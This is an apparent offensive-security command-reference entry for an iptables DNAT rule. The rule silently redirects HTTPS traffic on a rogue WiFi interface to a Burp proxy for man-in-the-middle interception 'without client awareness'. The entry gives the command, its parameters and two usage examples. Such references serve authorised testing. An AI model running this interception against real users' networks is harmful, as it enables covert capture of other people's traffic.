---
id: cmd-iptables-dnat-001
data: >-
  iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to
  $BURP_IP:8080
tags:
  - nat
  - redirect
  - mitm
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:44.820Z'
verified: false
validated: true
submitted: true
---
# iptables-dnat-https-to-proxy

## Command

```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to $BURP_IP:8080
```

## Description

This command appends a NAT rule to redirect incoming HTTPS traffic on the wlan0 interface to a specified proxy IP and port, used in MITM setups for transparent proxying without client awareness.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-t nat` | Specifies the NAT table | Yes |
| `-A PREROUTING` | Appends to PREROUTING chain | Yes |
| `-i wlan0` | Input interface (rogue WiFi) | Yes |
| `-p tcp` | Protocol match (TCP) | Yes |
| `--dport 443` | Destination port (HTTPS) | Yes |
| `-j DNAT` | Jump to DNAT target | Yes |
| `--to $BURP_IP:8080` | NAT destination (proxy IP:port) | Yes |

## Examples

### Basic Usage

```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to 127.0.0.1:8080
```

### Advanced Usage

```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to 192.168.1.100:8080
```

## Expected Output

No output if successful; rule added silently. Verify with `iptables -t nat -L -v -n` showing the rule and pkts/bytes counters increasing on traffic.

## Related

- [[commands/iptables-redirect-https-to-port]]
- [[procedures/Redirect-HTTPS-Traffic-Using-iptables]]
